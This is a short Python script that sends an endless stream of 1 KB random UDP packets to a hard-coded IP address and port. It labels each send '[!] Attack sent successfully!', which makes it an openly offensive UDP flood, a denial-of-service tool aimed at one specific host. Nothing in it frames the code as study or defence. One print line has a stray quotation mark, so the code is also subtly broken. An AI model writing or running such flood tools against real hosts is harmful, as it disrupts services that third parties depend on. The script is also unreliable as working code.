import socket
import random
import time
from colorama import Fore, init


UDP_IP = "185.107.192.21" 
UDP_PORT = 51814  

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def generate_random_data(size):
    return bytes(random.getrandbits(8) for _ in range(size))

try:
    while True:

        message = generate_random_data(1024)  
        sock.sendto(message, (UDP_IP, UDP_PORT))
        print("Fore.LIGHTGREEN_EX + "[!] Attack sent successfully!")
        time.sleep(0.1)  
except KeyboardInterrupt:
    print("Stopped by user")
except Exception as e:
    print(f"Error: {e}")